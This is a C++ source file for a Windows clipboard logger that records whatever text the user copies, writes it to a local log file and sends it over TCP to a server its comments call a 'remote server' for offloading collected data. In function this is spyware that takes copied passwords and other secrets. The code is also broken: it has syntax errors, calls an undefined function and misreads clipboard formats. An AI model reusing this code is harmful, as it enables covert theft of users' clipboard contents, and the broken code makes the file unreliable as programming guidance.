//These defines are needed to prevent winsock2 from calling window.h twice.
#define _WIN32_WINNT 0x501
#ifndef WIN32_LEAN_AND_MEAN
#define WIN32_LEAN_AND_MEAN
#endif

#include <Windows.h>
#include <iostream>
#include <fstream>
#include <sstream>
#include <string>
#include <conio.h>
//Libraries below are needed for transmitting files to remote server.
#include <winsock2.h>
#include <ws2tcpip.h>
#include <iphlpapi.h>
#include <stdio.h>
#include <map>
#pragma comment(lib, "Ws2_32.lib")


using namespace std;
//create a stream to a file stored in the Logbook object
string Logbook = "Log1.txt";
ofstream Recorder(Logbook);

// used for socket object
map<int, string>Format_names = { {0,"FAIL call from CountClipboardFormats function"}, {1,"CF_TEXT"},{2,"CF_BITMAP"},{3,"CF_METAFILEPICT"},{4,"CF_STLK"},{5,"CF_DIF"},{6,"CF_TIFF"},{7,"CF_OEMTEXT"},{8,"CF_DIB"},{9,"CF_PALETTE"}, {10,"CF_PENDATA"}, {11,"CF_RIFF"},{12,"CF_WAVE"},{13,"UNICODETEXT"}, {14,"CF_ENHMETAFILE"}, {15,"CF_HDROP"},{16,"CF_LOCALE"},{17,"CF_DIBV5"} };


int main() {
	bool GoodSocket = true;
	// This code is to connect to the remote server, to offload the data collected from the clipboard.
	WSADATA wsaData;
	int iResult = WSAStartup(MAKEWORD(2, 2), &wsaData);
	if (iResult != 0) {
		cout << "Wsastartup Failed.";
		GoodSocket = false;
	}


	struct addrinfo* result = NULL,
		* ptr = NULL,
		hints;

	ZeroMemory(&hints, sizeof(hints));
	hints.ai_family = AF_UNSPEC;
	hints.ai_socktype = SOCK_STREAM;
	hints.ai_protocol = IPPROTO_TCP;

#define DEFAULT_PORT "65432"

	// Resolve the server address and port
	iResult = getaddrinfo("127.0.0.1", DEFAULT_PORT, &hints, &result);
	if (iResult != 0) {
		printf("getaddrinfo failed: %d\n", iResult);
		WSACleanup();
		GoodSocket = false;
	}

	SOCKET ConnectSocket = INVALID_SOCKET;

	// Attempt to connect to the first address returned by
	// the call to getaddrinfo
	ptr = result;

	// Create a SOCKET for connecting to server
	ConnectSocket = socket(ptr->ai_family, ptr->ai_socktype,
		ptr->ai_protocol);

	if (ConnectSocket == INVALID_SOCKET) {
		printf("Error at socket(): %ld\n", WSAGetLastError());
		freeaddrinfo(result);
		WSACleanup();
		GoodSocket = false;G
	}





	// Connect to server.
	iResult = connect(ConnectSocket, ptr->ai_addr, (int)ptr->ai_addrlen);
	if (iResult == SOCKET_ERROR) {
		closesocket(ConnectSocket);
		ConnectSocket = INVALID_SOCKET;
	}

	// Should really try the next address returned by getaddrinfo
	// if the connect call failed
	// But for this simple example we just free the resources
	// returned by getaddrinfo and print an error message

	freeaddrinfo(result);

#define DEFAULT_BUFLEN 1024

	//This is a format example on how to send data to the server. To be deleted for release.
	const char* sendbuf;

	DWORD tOurSeq = -1;//our current count
	while (1) {//continuously run




		// get the clipboard count, used to validate if the clipboard has been updated. https://docs.microsoft.com/en-us/windows/win32/api/winuser/nf-winuser-getclipboardsequencenumber
		DWORD ClipSeq = GetClipboardSequenceNumber();
		//see if the clipboard and our count are the same to till if it change since our last count
		bool same = (ClipSeq == tOurSeq);
		//set our count to the clipboard count
		tOurSeq = ClipSeq;


		try {
			//https://docs.microsoft.com/en-us/windows/win32/api/winuser/nf-winuser-getclipboardformatnamea#return-value
			// Gathers the number of formats currently on clipboard https://docs.microsoft.com/en-us/windows/win32/api/winuser/nf-winuser-countclipboardformats
			UINT formats = CountClipboardFormats();
			UINT next_format = 0;
			next_format = EnumClipboardFormats(next_format);
			const int max_count = 4096;
			wchar_t format_name[max_count];
			int format = (int)formats;
	
			HANDLE in;
			if (!same) {
				ostringstream os;
				os << "Format " << format << ": " << Format_names.at(format) << " " << "Sequence :" << ClipSeq << " \n ";
				std::cout << "==========================================================================================================================" << endl;
				std::cout << "Format "<<format<<": " << Format_names.at(format) << " " << "Sequence :" << ClipSeq << endl;
				Recorder << "==========================================================================================================================" << endl;
				Recorder << "Format " <<format<<": "<< Format_names.at(format) << " " << "Sequence :" << ClipSeq << endl;

				if (ConnectSocket == INVALID_SOCKET&&!GoodSocket) {
					printf("Unable to connect to server!\n");
					WSACleanup();
					GoodSocket = false;
				}
				else printf("We are connected\n");

				switch (format) {
					//Data type: ANSI text
					//Use Case:text
					//CF_TEXT
				case 1:
					OpenClipboard(0);
					//grab text from the clipboard
					in = GetClipboardData(CF_TEXT);
					//using said text display it to the console and store into the Logbook
					std::cout << (string)in << endl;
					Recorder << (char*)in << endl;
					if (GoodSocket){
						os << (char*)in;
						string tmp = os.str();
						sendbuf = tmp.c_str();
						iResult = send(ConnectSocket, sendbuf, (int)strlen(sendbuf), 0);
					}
					CloseClipboard();
					break;
					//Data type:HBITMAP
					//Use Case:Handler to a bitmap (GDI Object)
					//CF_BITMAP
				case 2:

					break;
					//Data type: METAFILEPICT
					//Use Case: Windows-Format Metafiles picture
					//CF_MetafilePict
				case 3:
					break;
					//Data type:ANSI Text
					//Use Case:Microsoft Symbolic Link
					//Cf_Sylk
				case 4:
					break;
					
					//Data type:ASCII Text
					//Use Case:Software Arts Data Interchange Format
					//CF_Dif
				case 5:
					OpenClipboard(0);
					//grab text from the clipboard
					in = GetClipboardData(CF_TEXT);
					//using said text display it to the console and store into the Logbook
					std::cout << (char*)in << endl;
					Recorder << (char*)in << endl;
					if (GoodSocket) {

						os << (char*)in;
						string tmp = os.str();
						sendbuf = tmp.c_str();
						iResult = send(ConnectSocket, sendbuf, (int)strlen(sendbuf), 0);
					}
					CloseClipboard();
					break;
					//Data type:TIFF
					//Use Case:TIFF image
					//CF_TiFF
				case 6:
					break;
					//Data type:8-bit DOS text
					//Use Case:Text
					//CF_OEMTEXT
				case 7:
					OpenClipboard(0);
					//grab text from the clipboard
					in = GetClipboardData(CF_TEXT);
					//using said text display it to the console and store into the Logbook
					std::cout << (char*)in << endl;
					Recorder << (char*)in << endl;
					someFunc((char*))in);
					if (GoodSocket) {

						os << (char*)in;
						string tmp = os.str();
						sendbuf = tmp.c_str();
						iResult = send(ConnectSocket, sendbuf, (int)strlen(sendbuf), 0);
					}
					CloseClipboard();
					break;
					//Data type:BITMAPINFO
					//Use Case:Structure followed by bitmap bits
					//CF_DIB
				case 8:
					break;
					//Data type:HPALETTE
					//Use Case:Handle to a Color palette
					//CF_Palette
				case 9:
					break;
					//Data type:
					//Use Case:Windows 3.1 pen extension data
					//CF_PenDATA
				case 10:
					break;
					//Data type:RIFF
					//Use Case:Resource Interchange File Format (RIFF) audio
					//CF_RIFF
				case 11:
					break;
					//Data type:WAVE
					//Use Case:WAVE audio
					//CF_WAVE
				case 12:
					break;
					//Data type:Unicode text
					//Use Case:Text
					//CF_UNICODETEXT
				case 13:
					OpenClipboard(0);
					//grab text from the clipboard
					in = GetClipboardData(CF_TEXT);
					//using said text display it to the console and store into the Logbook
					std::cout << (char*)in << endl;
					Recorder << (char*)in << endl;
					if (GoodSocket) {

						os << (char*)in;
						string tmp = os.str();
						sendbuf = tmp.c_str();
						iResult = send(ConnectSocket, sendbuf, (int)strlen(sendbuf), 0);
					}
					CloseClipboard();
					break;
					//Data type:HENHMETAFILE
					//Use Case:Enhanced-Format Metafiles handle
					//CF_EMHMETAFILE
				case 14:
					break;
					//Data type:DROPFILES
					//Use Case:List of file names
					//CF_HDROP
				case 15:
					break;
					//Data type:DWORD(LCID) LCID for CF_TEXT to CF_UNICODE
					//Use Case:LCID for CF_TEXT to CF_UNICODE conversion
					//CF_LOCALE
				case 16:
					break;
					//Data type:BITMAPV5HEADER
					//Use Case:Structure followed by bitmap bits
					//CF_DIBV5
				case 17:
					break;
					//Data type:TEXT
					//Use Case:ANSI text
					//CF_DSPTEXT
				case 0x0081:
					break;
					//Data type:HBITMAP
					//Use Case:Structure followed by bitmap bits
					//CF_DSPBITMAP
				case 0x0082:
					break;
					//Data type:METAFILEPICT
					//Use Case:Windows-Format Metafiles picture
					//CF_DSPENHMETAFILE
				case 0x008E:
					break;
					//Data type:HENHMETAFILE
					//Use Case:	Enhanced-Format Metafiles handle
					//CF_DSPMETAFILEPICT
				case 0x0083:
					break;
					//Data type:
					//Use Case:
					//CF_GDIOBJFIRST
				case 0x0300:
					break;
					//Data type:
					//Use Case:
					//CF_GDIOBJLAST
				case 0x03FF:
					break;
					//Data type:
					//Use Case:
					//CF_OWNERDISPLAY
				case 0x0080:
					break;
					//Data type:
					//Use Case:
					//CF_PRIVATEFIRST
				case 0x0200:
					break;
					//Data type:
					//Use Case:
					//CF_PRIVATELAST
				case 0x02FF:
					break;


				default:
					break;
				}
				

			}
		}

		catch (exception e) {
			cout << "An exception was thrown: "<<e.what() << endl;

		}
	}
	Recorder.close();
	closesocket(ConnectSocket);
	WSACleanup();
}
